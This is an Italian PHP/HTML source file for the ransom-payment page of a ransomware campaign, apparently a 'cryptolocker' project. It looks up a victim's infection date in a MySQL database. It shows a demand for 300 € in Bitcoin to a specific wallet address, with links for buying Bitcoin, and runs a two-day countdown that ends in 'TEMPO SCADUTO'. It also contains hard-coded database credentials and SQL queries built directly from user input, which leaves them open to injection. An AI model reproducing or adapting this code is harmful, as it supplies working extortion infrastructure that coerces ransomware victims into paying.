<!DOCTYPE html>
<html>
  <head>

    <meta charset="utf-8">

    <title>Pagamento</title>

    <!-- Bootstrap Core CSS -->
    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,300italic,400italic,700italic" rel="stylesheet" type="text/css">
    <link href="vendor/simple-line-icons/css/simple-line-icons.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="css/stylish-portfolio.min.css" rel="stylesheet">

  </head>

<body class="text-white bg-primary" >

    <section class="content-section text-center">
      <div class="container">
        <div class="content-section-heading">
          <h2 class="mb-5" style="color:#ffd480;">PAGAMENTO</h2>
        </div>
		<div class="container text-center">
        <div class="row">
          <div class="col-lg-10 mx-auto">
			<?php 								
					$host = "sql.divini5g.com";
					$user = "divini5g07622";							
					$pass = "gucci";							
					$nome = "divini5g07622";
					$tab_nome = "cryptolocker";
					
					$utenteget= $_GET["utente"];
					$utente= $_POST["utente"];

					mysql_connect($host,$user,$pass) or die("Impossibile collegarsi al server");
					@mysql_select_db("$nome") or die("Impossibile connettersi al database $nome");
					
					if(isset($utenteget)){
						$sqlquery = "SELECT data FROM $tab_nome WHERE utente='$utenteget'" ;
						$result = mysql_query($sqlquery);
						$number = mysql_num_rows($result);
						while ($row= mysql_fetch_array($result))
						{
							$data = $row['data'];
						}
					}
					else{
						$sqlquery = "SELECT data FROM $tab_nome WHERE utente='$utente'" ;
						$result = mysql_query($sqlquery);
						$number = mysql_num_rows($result);
						while ($row= mysql_fetch_array($result))
							{
								$data = $row['data'];
							}
					}
				
					mysql_close();
			?>
			
			<h2 id="demo"></h2> </br></br></br>
			<h3 style="color:#ffd480;">Manda 300 € in Bitcoin a quest'indirizzo: 
			<h4 style="color: white;">1HKYcL9rfSkwCyWcRVB5FfkRMR9S4eP3eS</h4></h3>
			<div class="form-group">
				</br></br>
				<a href="https://bitcoin.org/it/" class="btn btn-xl btn-light mr-4" target="_blank">Cosa sono i Bitcoin</a>
				<a href="https://coin.space/?network=bitcoin" class="btn btn-xl btn-light mr-4" target="_blank">Creati un portafoglio</a>
				<a href="https://postebitcoin.com/acquista-bitcoin/vendi-bitcoin" class="btn btn-xl btn-light mr-4" target="_blank">Compra i Bitcoin</a>
			</div>
			
           <script>
			// Set the date we're counting down to  
			var countDownDate = "<?php echo $data?>";
			var countDownDate = new Date("<?php echo $data?>").getTime();
			
			// Update the count down every 1 second
			var x = setInterval(function() {

			// Get todays date and time
			var now = new Date().getTime();
    
			// Find the distance between now an the count down date
			var distance = countDownDate - now;
			
			//Timer per i 2 giorni
			distance= distance+2000*3600*24;
			
			// Time calculations for days, hours, minutes and seconds
			var days = Math.floor(distance / (1000 * 60 * 60 * 24));
			var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
			var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
			var seconds = Math.floor((distance % (1000 * 60)) / 1000);
    
			// Output the result in an element with id="demo"
			document.getElementById("demo").innerHTML = "Hai " + days + " giorno " + hours + " ore " + minutes + " minuti " + seconds + " secondi " + "per effettuare il pagamento.";
    
			// If the count down is over, write some text 
			if ((days < 0) && (hours < 0) && (minutes < 0) && (seconds < 0)) {
				clearInterval(x);
				document.getElementById("demo").innerHTML = "TEMPO SCADUTO";
				}
				}, 1000);
			</script>
          </div>
        </div>
      </div>
      </div>
    </section>
</body>
</html>